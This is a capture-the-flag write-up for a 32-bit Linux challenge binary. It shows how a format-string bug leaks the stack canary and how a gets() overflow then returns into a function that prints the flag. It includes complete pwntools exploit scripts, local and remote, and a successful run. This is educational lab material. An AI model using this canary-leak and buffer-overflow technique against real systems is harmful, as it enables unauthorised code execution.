# Finches in a Stack

## Protections

First, let's check the protections that this binary has using checksec:

```
sasha@kali:~/RACTF$ pwn checksec fias                                                                                                                                                                                                    
[*] '/home/kali/RACTF/fias'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So here's what we have to deal with:

Canary: This is a protection that places a random value before a return pointer, so that if you overwrite it with an invalid value, the program crashes

NX: This prevents us from executing our own shellcode by marking critical areas as non-executable

ASLR: This will randomize addresses such as libc ones, such as `system`. This won't affect us however

## Basic Reversing

Running the file shows us that the file takes user input twice, and the first input is printed back to the screen:
```
sasha@kali:~/RACTF$ ./fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? sashaCTF
Nice to meet you, sashaCTF!
Do YOU want to pet my canary?
yes
sasha@kali:~/RACTF$ 
```

Since our input is printed back to us, let's check for a format string vulnerability:
```
sasha@kali:~/RACTF$ ./fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? %x.%x        
Nice to meet you, f7f7f2c0.3e8!
Do YOU want to pet my canary?
yes
sasha@kali:~/RACTF$ 
```

And here we see it is vulnerable to format strings, which is what we can use to leak the canary

Now let's see the strings of this file:

```
sasha@kali:~/RACTF$ rabin2 -zqq fias
/bin/cat flag.txt
No! You bad canary! Get back in your cage!\n
I don't want you attacking anyone!\n
Hi! What's your name? 
Nice to meet you, 
Do YOU want to pet my canary?
sasha@kali:~/RACTF$ 
```

And we can see an interesting string:
> /bin/cat flag.txt

Lets now see the functions in this file:
```
sasha@kali:~/RACTF$ r2 fias
[0x080490c0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x080490c0]> afl
0x080490c0    1 50           entry0
0x080490f3    1 4            fcn.080490f3
0x08049090    1 6            sym.imp.__libc_start_main
0x08049120    4 49   -> 40   sym.deregister_tm_clones
0x08049160    4 57   -> 53   sym.register_tm_clones
0x080491a0    3 33   -> 30   entry.fini0
0x080491d0    1 2            entry.init0
0x080493e0    1 1            sym.__libc_csu_fini
0x08049239    3 194          sym.say_hi
0x08049110    1 4            sym.__x86.get_pc_thunk.bx
0x08049030    1 6            sym.imp.printf
0x08049040    1 6            sym.imp.gets
0x08049070    1 6            sym.imp.puts
0x080493f0    1 20           sym.__stack_chk_fail_local
0x08049050    1 6            sym.imp.__stack_chk_fail
0x080493e1    1 4            sym.__x86.get_pc_thunk.bp
0x08049404    1 20           sym._fini
0x080491fd    1 60           sym.anger
0x08049380    4 93           sym.__libc_csu_init
0x08049100    1 1            sym._dl_relocate_static_pie
0x080492fb    1 128          main
0x080490a0    1 6            sym.imp.setvbuf
0x08049060    1 6            sym.imp.getegid
0x080490b0    1 6            sym.imp.setresgid
0x0804937b    1 4            sym.__x86.get_pc_thunk.ax
0x080491d2    1 43           sym.flag
0x08049080    1 6            sym.imp.system
0x08049000    3 32           sym._init
[0x080490c0]> 
```
Here we see or regular functions, main, entry0 etc.
We can also see that the file uses `gets`, meaning its unsafely taking user input, making it easy for us to bof it, and uses `printf`, which we use for our format strings. We also see two custom functions `say_hi` and `anger`, which will be used in main.
Obviously the most important functions are `flag` and `system`. Lets disassemble `flag`:
```
[0x080490c0]> pdf @sym.flag
┌ 43: sym.flag ();
│           ; var int32_t var_4h @ ebp-0x4
│           0x080491d2      55             push ebp
│           0x080491d3      89e5           mov ebp, esp
│           0x080491d5      53             push ebx
│           0x080491d6      83ec04         sub esp, 4
│           0x080491d9      e89d010000     call sym.__x86.get_pc_thunk.ax
│           0x080491de      05222e0000     add eax, 0x2e22
│           0x080491e3      83ec0c         sub esp, 0xc
│           0x080491e6      8d9008e0ffff   lea edx, dword [eax - 0x1ff8]
│           0x080491ec      52             push edx
│           0x080491ed      89c3           mov ebx, eax
│           0x080491ef      e88cfeffff     call sym.imp.system         ; int system(const char *string)
│           0x080491f4      83c410         add esp, 0x10
│           0x080491f7      90             nop
│           0x080491f8      8b5dfc         mov ebx, dword [var_4h]
│           0x080491fb      c9             leave
└           0x080491fc      c3             ret
[0x080490c0]> 
```
So we see that flag executes a system command, and we can assume its using `/bin/cat flag.txt` from before. So we'll need to return back to this function with a bof

## Overview

This exploit is going to have 4 main parts

* Padding, to reach the canary
* Canary, to overwrite canary, so that the program doesn't crash
* More padding, to reach the return pointer
* Return Pointer, where we point back into `flag`

## Finding offset

I just found the offset in a lazy way, by trial and error, see where it started to crash the file due to me overwriting the canary. However, there are better ways of finding the offset, such as ghidra, radare2 or gdb. Anyway, I found the offset (of the second input) to be **25**

## Leaking Canary

Now, we need to bypass the stack canary. To do this, we need to leak it using format strings. The one usually used would either be `%11$p` or `%19$p`, but for this binary it is `%11$p`, as `%19$p` seems to leak the uid
(Note: I know that `%11$lx` or `%19$lx` can also be used, which just leak hex, I prefer to use $p, as it leaks it in the `0x` format)

Running the file in gdb, we can also check that this does leak the canary (breakpoint at say_hi as that's where input is taken):
```
sasha@kalivm:~/RACTF$ gdb fias
GNU gdb (Debian 9.1-3) 9.1
...
gdb-peda$ b say_hi
Breakpoint 1 at 0x804923e
gdb-peda$ r
```

These two lines of code are important as these actually take the canary from the `eax` register, and put it before the return pointer:
```
   0x804924c <say_hi+19>:       mov    eax,gs:0x14
=> 0x8049252 <say_hi+25>:       mov    DWORD PTR [ebp-0xc],eax
```
So we can see the canary in the eax register here:
```
[----------------------------------registers-----------------------------------]
EAX: 0x35131100 
EBX: 0x804c000 --> 0x804bf0c --> 0x1
```
So the canary for this runthrough is `0x35131100`
And fast forward to the second `printf` after `gets` which will print our leaked value:
```
gdb-peda$ 
0x35131100!
```
And they match!

## Finding second offset

Again, I did this via trial and error, and I made sure to use the correct canary of course. Through my trial and error, I found the second offset is **12**, then the next 4 bytes overwrite the return pointer

## Finding return pointer

This was simple, all I needed to do was view the functions, like I did before:
`0x080491d2    1 43           sym.flag`
So you'll get `0x080491d2`

## Creating local exploit

We now have everything we need to write the exploit, and I'll be using python3 with pwntools. And this is what my local exploit looked like:
```python
from pwn import *

e = ELF("fias")
io = e.process()

io.recvline()	# These recieve all the junk
io.recvline()
io.recvline()
io.recvline()

io.sendline("-%11$p-")			# Sends format string
recieved = io.recvline().decode().split("-")	# Leaks the canary, and recieves it
canary = int(recieved[1],16)		# Convert to hex number
log.info("Canary: " + str(hex(canary)))		# Print canary
io.recvline()	# More junk

payload = b"a" * 25		# Padding
payload += p32(canary)		# Canary (p32 is basically struct.pack)
payload += b'bbbbccccdddd'	# More padding
payload += p32(0x080491d2)	# Return pointer

io.sendline(payload)	# Send payload
print(io.recvline().decode())	# Recieve flag
io.close()
```

Of course make a `flag.txt` to cat when testing locally

## Transfering to remote

The script for remote is very similiar to local, again using python3 with pwntools. This is my script:
```python
from pwn import *
import sys

args = sys.argv[1].split(":")
ip = args[0]
port = args[1]

io = remote(ip,port)

io.recvline()	# These recieve all the junk
io.recvline()
io.recvline()
io.recvline()

io.sendline("-%11$p-")			# Sends format string
recieved = io.recvline().decode().split("-")	# Leaks the canary, and recieves it
canary = int(recieved[1],16)		# Convert to hex number
log.info("Canary: " + str(hex(canary)))		# Print canary
io.recvline()	# More junk

payload = b"a" * 25		# Padding
payload += p32(canary)		# Canary (p32 is basically struct.pack)
payload += b'bbbbccccdddd'	# More padding
payload += p32(0x080491d2)	# Return pointer

io.sendline(payload)	# Send payload
print(io.recvline().decode())	# Recieve flag
io.close()
```

Now to run it:
```
sasha@kali:~/RACTF$ python3 fiasremote.py 95.216.233.106:45124
[+] Opening connection to 95.216.233.106 on port 45124: Done
[*] Canary: 0x4c827a00
ractf{St4ck_C4n4ry_FuN!}

[*] Closed connection to 95.216.233.106 port 45124
sasha@kali:~/RACTF$
```
Challenge done!
